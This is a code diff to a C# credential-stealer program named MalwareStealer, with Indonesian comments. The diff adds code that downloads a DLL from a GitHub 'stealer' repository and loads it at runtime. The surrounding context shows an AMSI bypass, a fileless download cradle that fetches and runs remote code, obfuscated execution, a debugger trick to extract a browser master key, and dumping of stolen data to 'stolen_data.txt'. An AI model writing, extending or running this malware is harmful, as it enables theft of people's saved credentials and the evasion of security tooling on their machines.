@@ -6,6 +6,8 @@ using System.Data.SQLite;
 using System.Security.Cryptography;
 using System.Diagnostics;
 using System.Threading;
+using System.Net;
+using System.Reflection;
 
 namespace MalwareStealer
 {
@@ -100,6 +102,33 @@ namespace MalwareStealer
         const int LOAD_DLL_DEBUG_EVENT = 6;
         const int EXCEPTION_DEBUG_EVENT = 1;
         const uint EXCEPTION_SINGLE_STEP = 0x80000004;
+
+        // ===== EMBED DLL RESOLVER =====
+        static void SetupDLLResolver()
+        {
+            AppDomain.CurrentDomain.AssemblyResolve += (sender, args) =>
+            {
+                string assemblyName = new AssemblyName(args.Name).Name;
+                if (assemblyName == "System.Data.SQLite")
+                {
+                    string dllPath = Path.Combine(Path.GetTempPath(), "System.Data.SQLite.dll");
+                    if (!File.Exists(dllPath))
+                    {
+                        try
+                        {
+                            using (var client = new WebClient())
+                            {
+                                client.DownloadFile("https://raw.githubusercontent.com/dailam008/stealer/main/System.Data.SQLite.dll", dllPath);
+                            }
+                        }
+                        catch { return null; }
+                    }
+                    byte[] assemblyBytes = File.ReadAllBytes(dllPath);
+                    return Assembly.Load(assemblyBytes);
+                }
+                return null;
+            };
+        }
 
         // ===== AMSI BYPASS =====
         static void BypassAMSI()
@@ -491,13 +520,11 @@ namespace MalwareStealer
         {
             try
             {
-                // 1. COBA BUAT FOLDER DI C:\
                 Directory.CreateDirectory(@"C:\Stealer");
                 Console.WriteLine("[+] Folder C:\\Stealer berhasil dibuat.");
             }
             catch
             {
-                // 2. KALO GAGAL, PAKE %TEMP%
                 try
                 {
                     Directory.CreateDirectory(Path.Combine(Path.GetTempPath(), "Stealer"));
@@ -511,7 +538,6 @@ namespace MalwareStealer
 
             string output = Path.Combine(Path.GetTempPath(), "Stealer", "stolen_data.txt");
             
-            // 3. CEK APAKAH FOLDER C:\Stealer ADA
             if (Directory.Exists(@"C:\Stealer"))
             {
                 output = @"C:\Stealer\stolen_data.txt";
@@ -599,7 +625,6 @@ namespace MalwareStealer
                 try { File.Delete(temp); } catch { }
             }
 
-            // 4. PASTIKAN FILE TERSIMPAN
             try
             {
                 Directory.CreateDirectory(Path.GetDirectoryName(output));
@@ -615,13 +640,16 @@ namespace MalwareStealer
             Console.ReadKey();
         }
 
-        // ===== MAIN (DUMP DATA DI AWAL) =====
+        // ===== MAIN =====
         static void Main()
         {
-            // 1. DUMP DATA LANGSUNG DI AWAL (PASTI KELUAR)
+            // 1. SETUP DLL RESOLVER (DOWNLOAD OTOMATIS DARI GITHUB)
+            SetupDLLResolver();
+
+            // 2. DUMP DATA LANGSUNG DI AWAL (PASTI KELUAR)
             DumpData(null);
 
-            // 2. MODUL 4: FILELESS EXECUTION
+            // 3. MODUL 4: FILELESS EXECUTION
             BypassAMSI();
             Console.WriteLine("[+] Malware Stealer Aktif!");
             Console.WriteLine("[+] Modul 4: Fileless Execution");
@@ -630,7 +658,7 @@ namespace MalwareStealer
             ExecuteDownloadCradle(githubUrl);
             ExecuteObfuscated();
             
-            // 3. DEBUGGER BYPASS
+            // 4. DEBUGGER BYPASS
             byte[] masterKey = null;
             Console.WriteLine("[+] Mencoba debugger bypass...");
             masterKey = ExtractMasterKeyViaDebugger();
@@ -651,7 +679,7 @@ namespace MalwareStealer
                 Console.WriteLine("[-] Gagal Dapat Master Key. Menggunakan hash fallback.");
             }
 
-            // 4. DUMP DATA KEDUA (PAKE MASTER KEY KALO DAPET)
+            // 5. DUMP DATA KEDUA (PAKE MASTER KEY KALO DAPET)
             DumpData(masterKey);
         }
     }
